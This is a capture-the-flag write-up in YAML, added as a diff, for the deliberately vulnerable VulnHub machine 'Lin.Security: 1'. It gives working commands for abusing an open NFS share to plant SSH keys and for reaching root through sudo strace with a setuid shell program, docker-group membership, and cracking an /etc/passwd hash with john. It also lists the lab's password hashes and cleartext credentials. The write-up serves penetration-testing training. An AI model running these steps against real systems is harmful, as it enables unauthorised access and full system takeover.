@@ -1,0 +1,222 @@
+writeup:
+  metadata:
+    status: public
+    datetime: 20191010
+    infra: VulnHub
+    name: 'Lin.Security: 1'
+    points: 30
+    path: vulnhub.linsecurity1
+    url: https://www.vulnhub.com/entry/linsecurity-1,244/
+    references:
+      - https://in.security/lin-security-walkthrough/
+      - https://hackso.me/lin.security-1-walkthrough/
+    categories:
+      - oscp
+      - vulnhub
+      - linux
+    tags:
+      - exploit_nfs_rw
+      - exploit_ssh_authorizedkeys
+      - privesc_strace_setuid
+      - privesc_docker_group
+  overview:
+    description: |
+      This is a writeup for VulnHub VM [`Lin.Security: 1`](https://www.vulnhub.com/entry/linsecurity-1,244/). Here's an overview of the `enumeration → exploitation → privilege escalation` process:
+    killchain:
+      - "_ [VulnHub] Lin.Security: 1/192.168.92.186":
+        - ". Phase #1: Enumeration":
+          - ". 22/tcp":
+          - ". 111/tcp":
+          - ". 2049/tcp":
+            - ". open NFS share: /home/peter":
+              - ".. Phase #2: Exploitation":
+                - ".. mount and copy id_rsa.pub to .ssh/authorized_keys":
+                  - ".. ssh peter@192.168.92.186":
+                    - "... Phase #3: Privilege Escalation":
+                      - "... cleartext password for user susan in /home/susan/.secret file":
+                        - "... ssh susan@192.168.92.186":
+                            - "... strace has setuid":
+                              - "... privesc.c → privesc → sudo strace ./privesc":
+                                - "... root":
+                      - "... user peter is member of docker group":
+                        - "... copy /bin/sh with setuid and root ownership to local directory":
+                          - "... root":
+                      - "... unsalted hashed password for user insecurity in /etc/passwd":
+                        - "... crack using john with rockyou.txt":
+                          - "... root":
+          - ". 37211/tcp":
+          - ". 39735/tcp":
+          - ". 53127/tcp":
+          - ". 57997/tcp":
+    ttps:
+      "2049/tcp/nfs_acl/3 (RPC #100227)": exploit_nfs_rw exploit_ssh_authorizedkeys privesc_strace_setuid privesc_docker_group
+
+  enumeration:
+    steps:
+      - description: |
+          Here's the Nmap scan result:
+        command: |
+          # Nmap 7.70 scan initiated Wed Oct  9 19:28:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/xml/_quick_tcp_nmap.xml 192.168.92.186
+          Nmap scan report for 192.168.92.186
+          Host is up, received arp-response (0.0024s latency).
+          Scanned at 2019-10-09 19:28:19 PDT for 8s
+          Not shown: 997 closed ports
+          Reason: 997 resets
+          PORT     STATE SERVICE REASON         VERSION
+          22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+          | ssh-hostkey:
+          |   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)
+          | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6IO+zWqbr1ygGx4JPZUC/turDfHidMFqfTWv8glTZnpLnY6ZTTdQ8/HfSgAtwXSdOvSy6QwzSFxamx+TlV0mdrc8oJrcltmA31M0JwrGvCIQspLPuPDNgG3TwJitEb+HyS+PX0/hIIxnPz2LDl6E4/o0Va6HjA4p7qFKCt4PESN47lRvwMBiQjCucTf08yy9VZ7k2JJOvK9X/ebBz2OF3tJJHN3wiezMTIi7xAYSaT8XBHjf/3awUVqASEowf2gd14V8MM6ASwMVhcFGt0/DKxdXuiddphI67Z+3HCR3JsHgKl3nvhSmgTf5ZHt3HPgoe5XmL6LDjmkUGIdNrBya9
+          |   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)
+          | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEGq7yVBMw51IUPgAkmf4d8s6nVCPvcgXngPgU6tbTbFeFMUy1Do5mJziIp3eyLrFgZlTkfhjRdYhBoX/ZkM36Q=
+          |   256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)
+          |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICl+R8URLpkAb92x1+AMcdkp8qCHXphnD8fI+ObeoNs/
+          111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
+          | rpcinfo:
+          |   program version   port/proto  service
+          |   100000  2,3,4        111/tcp  rpcbind
+          |   100000  2,3,4        111/udp  rpcbind
+          |   100003  3           2049/udp  nfs
+          |   100003  3,4         2049/tcp  nfs
+          |   100005  1,2,3      37211/tcp  mountd
+          |   100005  1,2,3      37678/udp  mountd
+          |   100021  1,3,4      39735/tcp  nlockmgr
+          |   100021  1,3,4      43597/udp  nlockmgr
+          |   100227  3           2049/tcp  nfs_acl
+          |_  100227  3           2049/udp  nfs_acl
+          2049/tcp open  nfs_acl syn-ack ttl 64 3 (RPC #100227)
+          MAC Address: 00:0C:29:07:84:F0 (VMware)
+          Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+          Read data files from: /usr/bin/../share/nmap
+          Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+          # Nmap done at Wed Oct  9 19:28:27 2019 -- 1 IP address (1 host up) scanned in 14.69 seconds
+      - description: |
+          We find that there is an open NFS share for the `/home/peter` directory on the target system:
+        command: |
+          showmount -e 192.168.92.186
+        screenshot:
+          - ./screenshot01.png
+    findings:
+      openports:
+        - '22/tcp     |  ssh       |  OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)'
+        - '111/tcp    |  rpcbind   |  2-4 (RPC #100000)'
+        - '2049/tcp   |  nfs_acl   |  3 (RPC #100227)'
+        - '37211/tcp  |  mountd    |  1-3 (RPC #100005)'
+        - '39735/tcp  |  nlockmgr  |  1-4 (RPC #100021)'
+        - '53127/tcp  |  mountd    |  1-3 (RPC #100005)'
+        - '57997/tcp  |  mountd    |  1-3 (RPC #100005)'
+      users:
+        ssh:
+          - peter
+  exploitation:
+    steps:
+      - description: |
+          We mount this share locally and copy our SSH public key to the newly created `.ssh` directory within mounted NFS share:
+        command: |
+          cp ~/.ssh/id_rsa.pub ./authorized_keys
+          mkdir share
+          mount 192.168.92.186:/home/peter share/ -o vers=3
+          useradd -u 1001 peter
+          su peter
+          cd share
+          mkdir .ssh
+          cp ../authorized_keys .ssh/
+        screenshot:
+          - ./screenshot02.png
+          - ./screenshot03.png
+          - ./screenshot04.png
+      - description: |
+          Now we can SSH into the target system as user `peter`:
+        command: |
+          ssh peter@192.168.92.186
+        screenshot:
+          - ./screenshot05.png
+      - description: |
+          We find an interesting file `.secret` under user `susan`'s home directory. This file has the password in cleartext which we can use to login:
+        command: |
+          cat /home/susan/.secret
+          su susan
+        screenshot:
+          - ./screenshot06.png
+  postexploit:
+    user: peter
+    hostname: linsecurity
+    id: |
+      uid=1001(peter) gid=1005(peter) groups=1005(peter),999(docker)
+    uname: |
+      Linux linsecurity 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+    ifconfig: |
+      ens33:  flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+              inet 192.168.92.186  netmask 255.255.255.0  broadcast 192.168.92.255
+              inet6 fe80::20c:29ff:fe07:84f0  prefixlen 64  scopeid 0x20<link>
+              ether 00:0c:29:07:84:f0  txqueuelen 1000  (Ethernet)
+              RX packets 124781  bytes 75456965 (75.4 MB)
+              RX errors 0  dropped 0  overruns 0  frame 0
+              TX packets 99458  bytes 6136016 (6.1 MB)
+              TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+    users:
+      - bob
+      - peter
+      - susan
+  privesc:
+    steps:
+      - description: |
+          We find that the user `peter` can run `strace` with elevated privileges. This gives us a option to elevate privileges by tracing a program that spawns a shell:
+        command: |
+          nano privesc.c
+            #include <stdlib.h>
+            #include <unistd.h>
+            int main() {
+              setuid(0);
+              setgid(0);
+              system("/bin/bash");
+            }
+          gcc -o privesc privesc.c
+          sudo strace ./privesc
+        screenshot:
+          - ./screenshot07.png
+          - ./screenshot08.png
+      - description: |
+          We can also elevate privileges using `docker` since the user `peter` is already a member of group `docker`:
+        command: |
+          mkdir docker-test
+          cd docker-test
+          cat > Dockerfile
+            FROM debian:wheezy
+            ENV WORKDIR /stuff
+            RUN mkdir -p $WORKDIR
+            VOLUME [ $WORKDIR ]
+            WORKDIR $WORKDIR
+            << EOF
+          docker build -t my-docker-image .
+          docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
+          ./sh
+        screenshot:
+          - ./screenshot09.png
+          - ./screenshot10.png
+          - ./screenshot11.png
+      - description: |
+          We find that the user `insecurity`'s (unsalted) password hash is stored within `/etc/passwd`. We run a bruteforce on this hash to get the cleartext password. Since this user has same uid/gid as user `root`, we get elevated access on the target system:
+        command: |
+          cat /etc/passwd
+          echo "insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh" >passwd
+          john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt passwd
+            P@ssw0rd         (insecurity)
+          ssh insecurity@192.168.92.186
+        screenshot:
+          - ./screenshot12.png
+          - ./screenshot13.png
+  loot:
+    hashes:
+      - 'root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::'
+      - 'bob:$6$Kk0DA.6Xha4nL2p5$jq7qoit2l4ckULg1ZxcbL5wUz2Ld2ZUa.RYaIMs.Lma0EFGheX9yCXfKy37K0GsHz50FYIqIESo4QXWL.DYTI0:17721:0:99999:7:::'
+      - 'peter:$6$QpjS4vUG$Zi1KcJ7cRB8TJG9A/x7GhQQvJ0RoYwG4Jxj/6R58SJddU2X/QTQKNJWzwiByeTELKeyp0vS83kPsYITbTTmlb0:17721:0:99999:7:::'
+      - 'susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh30Gb32IBp5yZ7XvBR6uX9/SR/:17721:0:99999:7:::'
+    credentials:
+      ssh:
+        - bob/secret
+        - susan/MySuperS3cretValue!
+        - insecurity/P@ssw0rd
+  learning:
+    -
